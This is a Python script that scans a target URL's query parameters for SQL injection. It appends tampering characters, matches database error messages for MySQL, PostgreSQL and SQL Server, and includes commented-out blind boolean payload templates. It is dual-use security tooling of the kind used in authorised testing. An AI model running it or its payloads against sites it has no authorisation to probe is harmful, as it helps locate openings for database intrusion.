import difflib, http.client, itertools, optparse, random, re, urllib, urllib.parse, urllib.request  # Python 3 required

PREFIXES, SUFFIXES = (" ", ") ", "' ", "') "), ("", "-- -", "#", "%%16")            # prefix/suffix values used for building testing blind payloads
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')                                        # characters used for SQL tampering/poisoning of parameter values
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")                                     # boolean tests used for building testing blind payloads
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                             # optional HTTP header names                                                       
HTTPCODE, TITLE, HTML = range(3)                                             # enumerator-like values used for marking content type
FUZZY_THRESHOLD = 0.95                                                              # ratio value in range (0,1) used for distinguishing True from False responses
RANDINT = 66                                                # random integer value used across all tests #########################################################################################supp en entier

DBMS_ERRORS = {                                                                     # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
}

def _retrieve_content(url):
    retval = {HTTPCODE: http.client.OK}
    
    req = urllib.request.Request(url)
    retval[HTML] = urllib.request.urlopen(req).read()
   
    retval[HTML] = retval[HTML].decode("utf8")
    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)
    retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None
    return retval

def scan_page(url):
    original= None

    for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):
        vulnerable = False
        print("* scanning '%s'" % ( match.group("parameter")))
        original = original or (_retrieve_content(url))
        tampered = url.replace(match.group(0), "%s%s" % (match.group(0), urllib.parse.quote("".join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL))))))
        content = _retrieve_content(tampered) 
        for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
            if not vulnerable and re.search(regex, content[HTML], re.I) and not re.search(regex, original[HTML], re.I):
                print(" (i) parameter '%s' appears to be error SQLi vulnerable (%s)" % ( match.group("parameter"), dbms))
                vulnerable = True
        vulnerable = False
        # for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES, (False, True)):
        #     if not vulnerable:
        #         template = ("%s%s%s" % (prefix, boolean, suffix)).replace(" " if inline_comment else "/**/", "/**/")
        #         payloads = dict((_, url.replace(match.group(0), "%s%s" % (match.group(0), urllib.parse.quote(template % (RANDINT if _ else RANDINT + 1, RANDINT), safe='%')))) for _ in (True, False))
        #         contents = dict((_, _retrieve_content(payloads[_])) for _ in (False, True))
        #         if all(_[HTTPCODE] and _[HTTPCODE] < http.client.INTERNAL_SERVER_ERROR for _ in (original, contents[True], contents[False])):
        #             if any(original[_] == contents[True][_] != contents[False][_] for _ in (HTTPCODE, TITLE)):
        #                 vulnerable = True
        #             else:
        #                 ratios = dict((_, difflib.SequenceMatcher(None, original[HTML], contents[_][HTML]).quick_ratio()) for _ in (False, True))
        #                 vulnerable = all(ratios.values()) and min(ratios.values()) < FUZZY_THRESHOLD < max(ratios.values()) and abs(ratios[True] - ratios[False]) > FUZZY_THRESHOLD / 10
        #         if vulnerable:
        #             print(" (i) parameter '%s' appears to be blind SQLi vulnerable (e.g.: '%s')" % (match.group("parameter"), payloads[True]))


if __name__ == "__main__":

    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    options, _ = parser.parse_args()

    scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url)